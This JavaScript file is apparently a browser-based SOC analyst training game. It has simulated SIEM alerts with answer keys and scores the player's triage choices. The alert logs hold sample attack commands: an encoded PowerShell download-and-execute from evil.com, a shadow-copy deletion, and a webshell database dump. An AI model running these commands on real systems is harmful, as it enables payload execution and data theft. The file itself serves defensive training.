// Complete Alert Dataset (Stages 1 through 7)
const alerts = [
  // Core Infrastructure Alerts
  {
    id: 'ALT-1001',
    title: 'Suspicious PowerShell Execution',
    type: 'endpoint',
    severity: 'high',
    timestamp: '2026-09-03 10:42:11 UTC',
    sourceIp: '192.168.1.105',
    username: 'j.doe',
    correctAction: 'escalate',
    logs: {
      EventID: 4688,
      ProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine: "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      ParentProcess: "C:\\Windows\\explorer.exe"
    },
    explanation: "High Risk: Encoded PowerShell command pulling down external payloads bypasses default system policy."
  },

  // Phishing Scenarios
  {
    id: 'ALT-2001',
    title: 'Phishing: Spoofed Executive Credential Harvest',
    type: 'phishing',
    severity: 'high',
    timestamp: '2026-09-03 11:05:22 UTC',
    sourceIp: '203.0.113.195',
    username: 'c.smith (CFO)',
    correctAction: 'escalate',
    logs: {
      EmailSubject: "URGENT: Verify Your Payroll Details Immediately",
      SenderHeader: "CEO Direct <ceo-notice@mail-payroll-update-sec.com>",
      ReturnPath: "bounce@attacker-server.ru",
      SPF_Check: "FAIL",
      DKIM_Check: "FAIL",
      EmbeddedURL: "https://login-microsoft-portal.auth-verify.xyz/login"
    },
    explanation: "High Risk: Spoofed executive address targeting credentials via external domain with failing SPF/DKIM checks."
  },

  // Malware Scenarios
  {
    id: 'ALT-3001',
    title: 'Malware: Rapid File Encryption (Ransomware)',
    type: 'malware',
    severity: 'high',
    timestamp: '2026-09-03 11:30:15 UTC',
    sourceIp: '10.0.2.88',
    username: 'r.vance',
    correctAction: 'escalate',
    logs: {
      Process: "svchost_update.exe",
      Path: "C:\\Users\\r.vance\\AppData\\Local\\Temp\\svchost_update.exe",
      FileModificationsCount: 1420,
      ModifiedExtensions: [".locked", ".crypto"],
      ShadowCopyDeletionAttempt: "vssadmin.exe Delete Shadows /All /Quiet"
    },
    explanation: "High Risk: Ransomware pattern executing from a temp directory and rapidly encrypting user files."
  },

  // Cloud Security Scenarios
  {
    id: 'ALT-4001',
    title: 'Cloud: Leaked AWS IAM Access Key Usage',
    type: 'cloud',
    severity: 'high',
    timestamp: '2026-09-03 11:45:10 UTC',
    sourceIp: '198.51.100.42',
    username: 'aws_admin_key_AKIAIOSFODNN7',
    correctAction: 'escalate',
    logs: {
      EventSource: "cloudtrail.amazonaws.com",
      EventName: "CreateUser",
      AccessKeyId: "AKIAIOSFODNN7EXAMPLE",
      SourceLocation: "Frankfurt, DE (Unrecognized Location)",
      PolicyModified: "AdministratorAccess attached to new backdoor account"
    },
    explanation: "High Risk: A leaked AWS access key was used from an unusual location to create a backdoor admin account."
  },

  // Stage 7: FINAL BOSS ATTACK — Advanced Persistent Threat (APT)
  {
    id: 'ALT-9001',
    title: '🚨 CRITICAL: Web Server Webshell & Database Exfiltration',
    type: 'apt_attack',
    severity: 'high',
    timestamp: '2026-09-03 12:00:00 UTC',
    sourceIp: '45.154.255.87',
    username: 'www-data (IIS AppPool)',
    correctAction: 'escalate',
    logs: {
      AttackPhase: "Exfiltration / Privilege Escalation (MITRE ATT&CK TA0010)",
      WebLog: "POST /uploads/cmd.aspx?cmd=mysqldump+-u+root+-p+customers+>+exfil.sql",
      OutboundConnection: "45.154.255.87:443 (Transfer size: 4.8 GB)",
      DetectedWebshell: "C:\\inetpub\\wwwroot\\uploads\\cmd.aspx",
      SystemAlert: "Unscheduled massive database dump detected from DMZ web host"
    },
    explanation: "🚨 BOSS INCIDENT: Full web application compromise! Attacker uploaded a webshell (cmd.aspx), dumped the production database, and exfiltrated 4.8 GB of sensitive customer data to a Command & Control IP. Escalate to Incident Response Team instantly!"
  }
];

let selectedAlert = null;
let closedCount = 0;
let correctCount = 0;

function init() {
  renderAlertQueue();
  updateRankUI();
}

function renderAlertQueue() {
  const listEl = document.getElementById('alert-list');
  listEl.innerHTML = '';

  alerts.forEach(alert => {
    const card = document.createElement('div');
    card.className = `alert-card ${alert.severity}`;
    card.onclick = () => selectAlert(alert, card);
    card.innerHTML = `
      <div class="alert-title">${alert.title}</div>
      <div class="alert-meta">${alert.id} | ${alert.type.toUpperCase()}</div>
    `;
    listEl.appendChild(card);
  });
}

function selectAlert(alert, cardEl) {
  selectedAlert = alert;
  
  document.querySelectorAll('.alert-card').forEach(c => c.classList.remove('active'));
  cardEl.classList.add('active');

  const detailEl = document.getElementById('alert-detail');
  detailEl.innerHTML = `
    <h3>${alert.title} (${alert.id})</h3>
    <p><strong>Timestamp:</strong> ${alert.timestamp}</p>
    <p><strong>Category:</strong> <code>${alert.type.toUpperCase()}</code></p>
    <p><strong>Target/User:</strong> <code>${alert.username}</code></p>
    <p><strong>Source IP:</strong> <code>${alert.sourceIp}</code></p>
    <h4>Raw SIEM / Incident Audit Logs</h4>
    <div class="log-box">${JSON.stringify(alert.logs, null, 2)}</div>
  `;

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'none';
}

function makeDecision(action) {
  if (!selectedAlert) {
    alert("Select an alert from the queue first!");
    return;
  }

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'block';

  closedCount++;
  if (action === selectedAlert.correctAction) {
    correctCount++;
    feedbackEl.className = 'feedback-box correct';
    feedbackEl.innerHTML = `<strong>Correct Decision!</strong><br>${selectedAlert.explanation}`;
  } else {
    feedbackEl.className = 'feedback-box incorrect';
    feedbackEl.innerHTML = `<strong>Incorrect Decision.</strong><br>${selectedAlert.explanation}`;
  }

  document.getElementById('closed-count').innerText = closedCount;
  const accuracy = Math.round((correctCount / closedCount) * 100);
  document.getElementById('accuracy').innerText = `${accuracy}%`;

  updateRankUI();
}

// Stage 8: Analyst Scoring & Ranking Engine
function updateRankUI() {
  let rank = "Tier 1 Junior Analyst";
  const accuracy = closedCount > 0 ? Math.round((correctCount / closedCount) * 100) : 100;

  if (closedCount >= 5 && accuracy >= 80) {
    rank = "🏆 Principal SOC Lead";
  } else if (closedCount >= 3 && accuracy >= 60) {
    rank = "🛡️ Tier 2 Incident Responder";
  } else if (closedCount >= 1) {
    rank = "🔍 Tier 1 Analyst";
  }

  let metricsEl = document.getElementById('metrics');
  let rankSpan = document.getElementById('analyst-rank');
  if (!rankSpan) {
    metricsEl.insertAdjacentHTML('beforeend', ` <span>Rank: <strong id="analyst-rank" style="color:#00f2fe">${rank}</strong></span>`);
  } else {
    rankSpan.innerText = rank;
  }
}

window.onload = init;
